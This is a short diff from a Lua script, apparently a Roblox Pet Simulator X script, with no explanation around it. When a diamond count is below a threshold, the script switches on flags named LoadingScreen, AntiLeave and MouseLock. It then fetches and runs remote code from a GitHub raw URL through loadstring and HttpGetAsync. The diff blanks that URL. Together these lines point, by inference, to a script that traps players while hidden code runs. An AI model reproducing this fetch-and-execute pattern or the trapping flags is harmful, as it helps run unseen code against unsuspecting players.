@@ -755,7 +755,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = true
     _G.AntiLeave = true
     _G.MouseLock = true
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/PsxBank/main/Bank.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
